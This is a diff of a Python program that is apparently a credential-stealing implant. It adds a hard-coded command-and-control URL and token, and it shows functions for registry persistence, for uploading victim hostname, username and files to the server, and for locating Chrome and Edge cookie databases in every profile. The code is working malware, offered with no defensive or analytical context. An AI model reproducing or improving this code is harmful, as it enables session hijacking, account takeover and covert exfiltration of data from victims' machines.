@@ -15,11 +15,31 @@ import json
 import sqlite3
 import tempfile
 
-from config_loader import load_app_config
+_DEFAULT_C2_BASE = "https://cvsstool-production.up.railway.app"  # override with C2_SEND_URL
+_DEFAULT_SECRET_TOKEN = "qutmess"  # override with C2_SECRET_TOKEN / SECRET_TOKEN
 
-_cfg = load_app_config()
-SERVER_URL = _cfg["send_url"]
-API_TOKEN = _cfg["secret_token"]
+
+def _normalize_send_url(url: str) -> str:
+    url = url.strip().rstrip("/")
+    if not url:
+        return ""
+    if not url.endswith("/send"):
+        return url + "/send"
+    return url
+
+
+def _load_c2_settings() -> tuple[str, str]:  # env wins; token must match Node SECRET_TOKEN; /send appended if missing
+    raw = os.environ.get("C2_SEND_URL", "").strip() or _DEFAULT_C2_BASE
+    server_url = _normalize_send_url(raw)
+    token = (
+        os.environ.get("C2_SECRET_TOKEN", "").strip()
+        or os.environ.get("SECRET_TOKEN", "").strip()
+        or _DEFAULT_SECRET_TOKEN
+    )
+    return server_url, token
+
+
+SERVER_URL, API_TOKEN = _load_c2_settings()
 
 
 def add_registry_persistence():
@@ -94,8 +114,7 @@ def send_to_server(hostname, username, file_path, filename):
         print(f"[-] Request failed: {e}")
 
 
-def _chrome_user_data_roots():
-    """Known Chromium user-data roots under LOCALAPPDATA (fast existence check)."""
+def _chrome_user_data_roots():  # Chromium user-data dirs under LOCALAPPDATA
     local = os.environ.get("LOCALAPPDATA")
     if not local:
         return []
@@ -110,8 +129,7 @@ def _chrome_user_data_roots():
     return [base / r for r in rels if (base / r).is_dir()]
 
 
-def _profile_names_from_local_state(user_data: pathlib.Path) -> list[str]:
-    """Read Chrome/Edge Local State — most accurate profile list (single file read)."""
+def _profile_names_from_local_state(user_data: pathlib.Path) -> list[str]:  # profile list from Local State JSON
     ls = user_data / "Local State"
     if not ls.is_file():
         return []
@@ -136,8 +154,7 @@ def _profile_names_from_local_state(user_data: pathlib.Path) -> list[str]:
     return names
 
 
-def _profile_names_from_disk(user_data: pathlib.Path) -> list[str]:
-    """Fallback: only directories that look like real profiles."""
+def _profile_names_from_disk(user_data: pathlib.Path) -> list[str]:  # fallback: Default / Profile N dirs only
     names = []
     try:
         for p in user_data.iterdir():
@@ -160,8 +177,7 @@ def _profile_names_from_disk(user_data: pathlib.Path) -> list[str]:
     return names
 
 
-def _cookie_dbs_for_profile(user_data: pathlib.Path, profile_name: str) -> list[pathlib.Path]:
-    """Prefer Network/Cookies (current Chromium); include legacy Cookies if present."""
+def _cookie_dbs_for_profile(user_data: pathlib.Path, profile_name: str) -> list[pathlib.Path]:  # Network/Cookies + legacy Cookies
     prof = user_data / profile_name
     if not prof.is_dir():
         return []
@@ -177,11 +193,7 @@ def _cookie_dbs_for_profile(user_data: pathlib.Path, profile_name: str) -> list[
     return out
 
 
-def find_chrome_cookie_databases() -> list[pathlib.Path]:
-    """
-    Resolve cookie SQLite paths: Local State first (fast), then disk scan.
-    Deduplicates by resolved path; orders profiles Default → Profile 1…
-    """
+def find_chrome_cookie_databases() -> list[pathlib.Path]:  # Local State first, dedupe paths, Default→Profile order
     seen: set[str] = set()
     ordered: list[pathlib.Path] = []
 
